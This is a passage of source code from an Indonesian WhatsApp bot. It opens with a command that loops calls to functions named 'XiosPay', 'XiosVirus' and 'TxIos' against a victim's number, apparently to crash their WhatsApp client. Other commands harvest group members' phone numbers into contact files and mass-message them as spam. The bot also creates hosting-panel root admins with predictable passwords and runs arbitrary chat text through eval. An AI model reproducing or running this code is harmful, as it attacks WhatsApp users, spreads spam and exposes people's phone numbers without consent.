if (!q) return reply(`🐉 𝐁𝐮𝐤𝐚𝐧 𝐆𝐢𝐭𝐮 𝐓𝐚𝐩𝐢\n ${prefix + command} 62xxxx`)
X = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝐏𝐫𝐨𝐬𝐞𝐬𝐬〽️")
for (let i = 0; i < 10; i++) {
await XiosPay(X)
await XiosVirus(X)
await TxIos(X, Ptcp = true)
await sleep(1)
}
kyami.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
}
break
case 'cpanel': {
if (!Creator && !reseller && !groupseller) return reply(mess.seller)
if (args < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} 1gb user nomer`)
let user = args[1]
let number = args[2]
if(!args[1] && !args[2]) return reply(`*Format salah!*
Penggunaan:
${prefix + command} 1gb user nomer`)
 if (args[0] === "1gb") {
 cpanell(user, number, "1000", "30")
 }else if (args[0] === "2gb") {
 cpanell(user, number, "2000", "40")
 }else if (args[0] === "3gb") {
 cpanell(user, number, "3000", "60")
 }else if (args[0] === "4gb") {
 cpanell(user, number, "4000", "80")
 }else if (args[0] === "5gb") {
 cpanell(user, number, "5000", "100")
 }else if (args[0] === "6gb") {
 cpanell(user, number, "6000", "120")
 }else if (args[0] === "7gb") {
 cpanell(user, number, "7000", "140")
 }else if (args[0] === "8gb") {
 cpanell(user, number, "8000", "160")
 }else if (args[0] === "9gb") {
 cpanell(user, number, "9000", "180")
 }else if (args[0] === "710gb") {
 cpanell(user, number, "10000", "200")
 }else if (args[0] === "unli") {
 cpanell(user, number, "0", "0")
 }
 }
 break
 //====================\\
 case 'delpanel': {
if (!Creator && !reseller && !groupseller) return reply(mess.seller)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply("example : .delpanel idservernya\n\nuntuk melihat id server ketik *.listserver*")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
reply(`Berhasil Menghapus Akun Panel *${sections[0]}*`)
kyami.sendMessage(owner + "@s.whatsapp.net", {
                    text: `*DELETE PANEL NOTIFY*\n\n${m.sender.split("@")[0]}\ baru saja menghapus panel *${sections[0]}*`,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
}
break
//====================\\
case 'ramlist': {
reply(`*LIST RAM PANEL YANG DAPAT DI BUAT 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*

• RAM 1GB CPU 30
• RAM 2GB CPU 40
• RAM 3GB CPU 60
• RAM 4GB CPU 80
• RAM 5GB CPU 100
• RAM 6GB CPU 120
• RAM 7GB CPU 140
• RAM 8GB CPU 160
• RAM 9GB CPU 180
• RAM 10GB CPU 200
• UNLI

> CARA BUAT PANEL BY 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜

.cpanel 1gb unyah 62896*****
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
.cpanel ram nama nomer

\`Note : Untuk Ram Pakai Huruf Kecil Semua Misal 1GB Jadi 1gb\`
`)}
break
//====================\\
case 'listserver': {
if (!Creator && !reseller && !groupseller) return reply(mess.seller)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await kyami.sendMessage(m.chat, { text: messageText }, { quoted: m });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break

//====================\\
case 'addadmin': case 'createadmin': {
if (!Creator) return reply(mess.owner)
if (args.length < 1) return m.reply(`Contoh: ${prefix+command} nama nomor`);
let username = args[0];
let u = m.quoted ? m.quoted.sender : args[1] ? args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply(`Contoh: ${prefix+command} nama nomor`);
let d = (await kyami.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"admin"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + '@gmail.com',
"username": username,
"first_name": username,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
m.reply(`BERHASIL CADMIN!

• ID: ${user.id}
• UUID: ${user.uuid}
• Username: ${username}

Data lainnya sudah terkirim ke
privat chat...`)
let teksnyo = `*BERIKUT DATA ADMIN PANEL ANDA 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜*

• ID: ${user.id}
• UUID: ${user.uuid}
• Username: ${user.username}
• Password: ${password.toString()}

Simpan data admin panel baik-baik
Karna admin hanya 1 kali kirim data admin panel.`

kyami.sendMessage(u, { caption: teksnyo, image: fs.readFileSync("./start/data/image/thumb.jpg") });
}
break
case 'deladmin': {
if (!Creator) return reply(mess.owner)
if (!args[0]) return m.reply(`${prefix + command} id\n\nuntuk melihat id admin ketik *.listadmin*`)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
reply(`Berhasil Menghapus Admin Panel *${getid}*`)
}
break
//====================\\
case 'listadmin': {
if (!Creator) return reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let user = res2.data;
let totaladmin = 0
if (user.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT"
await user.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
kyami.sendText(m.chat, teks, qtoko)
}
break
//=======================\\
case 'addreseller': {
   if (!Creator) return reply(mess.owner)
   if (args.length < 1) return reply(`Usage ${prefix + command} 62896681***`)
   global.db.data.users[args[0] + "@s.whatsapp.net"].resellerpanel = true
   reply(`sukses add reseller panel ke ${args[0]}`)
}
break
//===========================//
case 'delreseller': {
   if (!Creator) return reply(mess.owner)
   if (args.length < 1) return reply(`Usage ${prefix + command} 62896681***`)
   global.db.data.users[args[0] + "@s.whatsapp.net"].resellerpanel = false
   reply(`sukses del reseller panel ke ${args[0]}`)
}
break
//===========================//
case 'addgroupreseller': {
   if (!Creator) return reply(mess.owner)
   if (!isGroup) return reply(mess.ingroup)
   global.db.data.chats[from].resellerpanelgrup = true
   reply(`sukses add group reseller panel ke ${groupMetadata.subject}`)
}
break
//===========================//
case 'delgroupreseller': {
   if (!Creator) return reply(mess.owner)
   if (!isGroup) return reply(mess.ingroup)
   global.db.data.chats[from].resellerpanelgrup = false
   reply(`sukses del group reseller panel ke ${groupMetadata.subject}`)
}
break
//===========================//
case "savekontak": {
if (!Creator) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.ingroup)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./start/lib/database/contact.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK JB [${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./start/lib/database/contact.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await kyami.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/database/contact.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/database/contact.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/database/contact.vcf", "")
}}
break
case "savekontak2": {
if (!Creator) return m.reply(mess.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await kyami.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./start/lib/database/contact.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK JB[${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./start/lib/database/contact.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await kyami.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/database/contact.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/database/contact.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/database/contact.vcf", "")
}}
break
case "pushkontak": {
if (!Creator) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.ingroup)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./start/lib/database/contact.json', JSON.stringify(contacts))
await kyami.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: KONTAK JB [${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./start/lib/database/contact.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await kyami.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/database/contact.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/database/contact.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/database/contact.vcf", "")
}}
break
case "pushkontak1": {
if (!Creator) return m.reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await kyami.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./start/lib/database/contact.json', JSON.stringify(contacts))
await kyami.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK JB [${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./start/lib/database/contact.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await kyami.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/database/contact.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/database/contact.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/database/contact.vcf", "")
}}
break
case "pushkontak2": {
if (!Creator) return m.reply(mess.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await kyami.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./start/lib/database/contact.json', JSON.stringify(contacts))
await kyami.sendMessage(mem, {text: teks}, {quoted: qloc2})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN: KONTAK JB [${createSerial(2)}]`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./start/lib/database/contact.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await kyami.sendMessage(m.sender, { document: fs.readFileSync("./start/lib/database/contact.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./start/lib/database/contact.json", JSON.stringify(contacts))
await fs.writeFileSync("./start/lib/database/contact.vcf", "")
}}
break
case "idgc": {
if (!Creator) return m.reply(mess.owner)
if (!isGroup) return m.reply(mess.ingroup)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekid": case"listgrup": {
let gcall = Object.values(await kyami.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break
default:
if (chats.luminai && m.text) { 
if (m.fromMe) return
let chats = await luminai(m.text, `namamu adalah 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜, ubah sifatmu seorang wanita yang pintar dan lucu, gunakan salah satu dari "(⁠人⁠ ⁠•͈⁠ᴗ⁠•͈⁠), (⁠◡⁠ ⁠ω⁠ ⁠◡⁠), (⁠ ⁠ꈍ⁠ᴗ⁠ꈍ⁠)" untuk menyampa user, dan gunakan salah satu ekspresi ini "(⁠ ⁠･ั⁠﹏⁠･ั⁠), (⁠｡⁠•́⁠︿⁠•̀⁠｡⁠), (⁠’⁠;⁠︵⁠;⁠’)" untuk sedih, dan gunakan salah satu ekspresi ini "(⁠ᗒ⁠ᗩ⁠ᗕ⁠), (⁠ ⁠≧⁠Д⁠≦⁠), .⁠·⁠’⁠¯⁠'⁠(⁠>⁠▂⁠<⁠)⁠'⁠¯⁠‘⁠·⁠." ketika menangis dan gunakan ${pushname} untuk menyebutkan nama user`, `${pushname}`)
//await sleep(5000)
let puqi = chats.result
reply(puqi)
}
        
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)

}
catch (e) {
console.log(e)
}}
    
        
}
} catch (err) {
console.log(require("util").format(err));
await kyami.sendMessage(`${owner}@s.whatsapp.net`, {text: `${util.format(err)}

Command From: ${m.sender.split("@")[0]}`}, {quoted: m})
    
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
